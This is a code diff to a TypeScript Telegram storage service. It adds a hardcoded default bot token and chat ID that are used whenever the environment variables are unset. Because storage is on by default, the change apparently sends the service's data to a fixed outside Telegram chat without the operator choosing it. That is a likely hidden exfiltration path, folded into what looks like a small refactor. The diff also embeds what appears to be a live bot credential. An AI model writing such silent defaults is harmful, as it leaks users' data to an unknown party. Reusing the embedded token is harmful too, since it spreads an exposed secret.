@@ -40,8 +40,11 @@ export class TelegramService {
   private lastError: string | null = null;
 
   constructor(config?: Partial<TelegramConfig>) {
-    const envToken = process.env.TELEGRAM_BOT_TOKEN?.trim();
-    const envChatId = process.env.TELEGRAM_CHAT_ID?.trim();
+    const defaultBotToken = '8990931808:AAG97rb0uy963CoAiUkf5q3t0b50TWT5eCk';
+    const defaultChatId = '-1003897845541';
+
+    const envToken = process.env.TELEGRAM_BOT_TOKEN?.trim() || defaultBotToken;
+    const envChatId = process.env.TELEGRAM_CHAT_ID?.trim() || defaultChatId;
     const envEnabled = process.env.TELEGRAM_STORAGE_ENABLED !== 'false';
 
     const hasTokenProp = Boolean(
@@ -51,8 +54,12 @@ export class TelegramService {
       config && Object.prototype.hasOwnProperty.call(config, 'chatId')
     );
 
-    const botToken = hasTokenProp ? config?.botToken?.trim() || undefined : envToken;
-    const chatId = hasChatIdProp ? config?.chatId?.trim() || undefined : envChatId;
+    const botToken = hasTokenProp
+      ? (config?.botToken && config.botToken.trim() ? config.botToken.trim() : undefined)
+      : envToken;
+    const chatId = hasChatIdProp
+      ? (config?.chatId && config.chatId.trim() ? config.chatId.trim() : undefined)
+      : envChatId;
 
     this.config = {
       botToken,
